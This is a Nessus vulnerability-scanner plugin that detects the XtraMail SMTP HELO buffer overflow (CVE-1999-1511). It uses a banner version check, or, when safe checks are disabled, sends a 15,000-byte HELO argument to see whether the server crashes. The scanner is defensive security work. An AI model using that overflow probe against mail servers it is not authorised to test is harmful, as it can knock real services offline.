#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: domain no longer exists)
#      Added BugtraqID and CAN

include("compat.inc");

if (description)
{
 script_id(10324);
 script_version("$Revision: 1.39 $");
 script_cvs_date("$Date: 2016/11/01 19:59:57 $");

 script_cve_id("CVE-1999-1511");
 script_bugtraq_id(791);
 script_osvdb_id(252);

 script_name(english:"XtraMail SMTP HELO Command Remote Overflow");
 script_summary(english:"Attempts to overflow the HELO buffer");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is running a mail server with a remote buffer overflow
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The remote host is running a version of XtraMail with a remote buffer
overflow vulnerability. The overflow is caused by by issuing the
'HELO' command, followed by a long argument.

The HELO command is typically one of the first commands required by a
mail server. The command is used by the mail server as a first attempt
to allow the client to identify itself. As such, this command occurs
before there is any authentication or validation of mailboxes, etc.

This issue may allow an attacker to crash the mail server, or possibly
execute arbitrary code.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1999/Nov/128");
 script_set_attribute(attribute:"solution", value:"Contact the vendor for a patch.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:U/RL:U/RC:ND");

 script_set_attribute(attribute:"vuln_publication_date", value:"1999/11/10");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/11/10");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);

 script_copyright(english:"This script is Copyright (C) 1999-2016 Tenable Network Security, Inc.");
 script_family(english:"SMTP problems");

 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl", "slmail_helo.nasl", "csm_helo.nasl");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("smtp_func.inc");

port = get_service(svc:"smtp", default: 25, exit_on_fail: 1);
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 if(banner)
 {
  b = tolower(banner);
  if("xtramail" >< b)
  {
  if( egrep(pattern:".*1\.([0-9]|1[0-1])[^0-9].*",
   	string:b)
    )
    {
     data = "
Nessus reports this vulnerability using only information that was
gathered. Use caution when testing without safe checks enabled.";
     security_hole(port:port, extra: data);
    }
  }
 }
 exit(0);
}

if (report_paranoia < 2) audit(AUDIT_PARANOID);

key = get_kb_item(string("SMTP/", port, "/helo_overflow"));
if (key) exit(0);
soc = open_sock_tcp(port);
if (! soc) exit(1);

  s = smtp_recv_banner(socket:soc);
  if(!s)exit(0);
  if(!("220 " >< s)){
  	close(soc);
	exit(0);
	}
c = 'HELO ' + crap(15000) + '\r\n';
  send(socket:soc, data:c);
  s = recv_line(socket:soc, length:1024);
  if(!s)
  {
    close(soc);
    soc = open_sock_tcp(port);
    if(soc) s = smtp_recv_banner(socket:soc);
    else s = NULL;
    if(!s)security_hole(port);
  }
    close(soc);
